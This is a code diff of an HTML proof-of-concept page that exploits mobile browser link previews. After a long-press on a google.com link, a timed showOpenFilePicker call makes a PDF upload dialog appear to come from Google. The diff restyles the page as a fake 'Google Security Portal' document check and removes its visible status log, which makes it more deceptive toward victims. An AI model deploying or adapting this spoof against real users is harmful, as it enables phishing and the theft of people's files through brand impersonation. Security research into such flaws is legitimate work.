@@ -1,99 +1,106 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced PoC - File Picker Origin Spoofing</title>
+    <title>Advanced Security PoC - File Picker Origin Spoofing</title>
     <style>
         body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #fcfcfc;
+            color: #202124;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
-        }
-        .card {
-            background-color: #1e293b;
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            padding: 20px;
             text-align: center;
-            max-width: 400px;
         }
-        a.target-link {
+        .banner {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        h1 {
+            font-size: 22px;
+            color: #1a73e8;
+            margin-bottom: 24px;
+        }
+        a.spoof-link {
             display: inline-block;
-            background-color: #3b82f6;
+            background-color: #1a73e8;
             color: white;
-            padding: 12px 24px;
+            padding: 16px 32px;
             text-decoration: none;
-            font-weight: bold;
-            border-radius: 6px;
-            margin-top: 15px;
-            transition: background 0.2s;
+            font-weight: 600;
+            font-size: 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+            transition: background-color 0.2s;
         }
-        a.target-link:active {
-            background-color: #2563eb;
+        a.spoof-link:active {
+            background-color: #1557b0;
         }
-        #log {
-            margin-top: 20px;
-            font-size: 0.85rem;
-            color: #94a3b8;
-            font-family: monospace;
+        .footer-note {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #9aa0a6;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>Security Verification</h2>
-        <a>Tekan dan tahan (Long Press) tautan di bawah ini, lalu pilih opsi <a>"Preview Page"</a>.</a>
-        
-        <!-- Target Link yang memicu konteks menu -->
-        <a href="https://google.com" class="target-link" id="spoofTarget">Long Press -> Preview Page</a>
-        
-        <div id="log">Status: Menunggu interaksi...</div>
-    </div>
+    <div class="banner">Google Security Portal</div>
+    <h1>Verifikasi Dokumen Pengguna</h1>
+
+    <!-- Tautan target untuk memicu Preview Page -->
+    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page</a>
+
+    <div class="footer-note">Sistem verifikasi aman berbasis cloud.</div>
 
     <script>
-        const logElement = document.getElementById("log");
+        let triggered = false;
 
-        // Memperkuat penangkapan event contextmenu dan interaksi sentuh
-        document.addEventListener("contextmenu", (e) => {
-            logElement.innerText = "Status: Context menu terdeteksi. Mengatur timer eksekusi...";
-            
-            // Penundaan waktu yang disesuaikan agar dialog muncul tepat saat panel preview aktif
+        // Fungsi eksekusi utama File System Access API
+        const executeAttackVector = () => {
+            if (triggered) return;
+            triggered = true;
+
+            // Timer disesuaikan untuk menunggu transisi animasi panel preview terbuka
             setTimeout(async () => {
                 try {
-                    logElement.innerText = "Status: Memanggil window.showOpenFilePicker()...";
-                    
-                    // Eksekusi API file picker di latar belakang saat preview sheet terbuka
-                    const handle = await window.showOpenFilePicker({
+                    await window.showOpenFilePicker({
+                        multiple: false,
                         types: [{
-                            description: 'Dokumen Verifikasi',
+                            description: 'Dokumen Verifikasi Resmi (.pdf)',
                             accept: { 'application/pdf': ['.pdf'] }
                         }]
                     });
-                    
-                    logElement.innerText = "Status Sukses: Dialog file picker berhasil dipicu!";
                 } catch (err) {
-                    // Menangkap error jika dibatalkan pengguna atau diblokir oleh patch keamanan browser
-                    logElement.innerText = `Status Diblokir/Gagal: ${err.name} - ${err.message}`;
+                    // Menangkap error pembatalan atau jika patch keamanan browser sudah aktif
+                    console.debug("Aksi file picker dihentikan atau diblokir:", err.message);
+                } finally {
+                    // Reset status agar dapat diuji kembali jika diperlukan
+                    setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 1400); // Waktu tunda optimal dalam milidetik (dapat disesuaikan)
+            }, 1700); // Waktu optimal jeda milidetik untuk membuka ephemeral tab
+        };
+
+        // Menggunakan multi-event listener untuk memperkuat pemicu interaksi seluler
+        const targetElement = document.getElementById("targetLink");
+
+        targetElement.addEventListener("contextmenu", (e) => {
+            executeAttackVector();
         });
 
-        // Tambahan pemantauan visibilitas halaman untuk melacak status transisi tab/preview
-        document.addEventListener("visibilitychange", () => {
-            if (document.hidden) {
-                console.log("[PoC] Halaman utama tertutup/berada di latar belakang karena preview aktif.");
-            } else {
-                console.log("[PoC] Pengguna kembali ke halaman utama.");
-            }
-        });
+        targetElement.addEventListener("touchstart", (e) => {
+            // Membantu menangkap awal gestur sentuh tahan lama (long-press)
+            // Tanpa menghentikan fungsi bawaan browser agar preview tetap muncul
+        }, { passive: true });
     </script>
 
 </body>
